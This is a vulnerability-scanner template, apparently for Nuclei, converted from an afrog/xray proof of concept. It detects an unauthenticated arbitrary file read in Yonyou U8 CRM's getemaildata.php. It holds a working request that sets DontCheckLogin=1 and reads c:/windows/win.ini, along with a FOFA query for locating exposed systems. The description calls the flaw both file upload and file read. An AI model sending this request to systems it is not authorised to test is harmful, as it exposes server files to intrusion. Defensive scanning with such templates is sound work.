# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - bit app support
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/ajax/getemaildata.php?DontCheckLogin=1&filePath=c:/windows/win.ini'
id: yonyou-u8-crm-getemaildata-fileread
info:
  author: peiqi
  description: |
    用友 U8 CRM客户关系管理系统 getemaildata.php 文件存在任意文件上传漏洞，攻击者通过漏洞可以获取到服务器权限，攻击服务器
    FOFA: body="用友U8CRM"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 用友 U8 CRM客户关系管理系统 getemaildata.php 任意文件读取漏洞
  severity: high
  tags: yonyou,fileread,argus-import
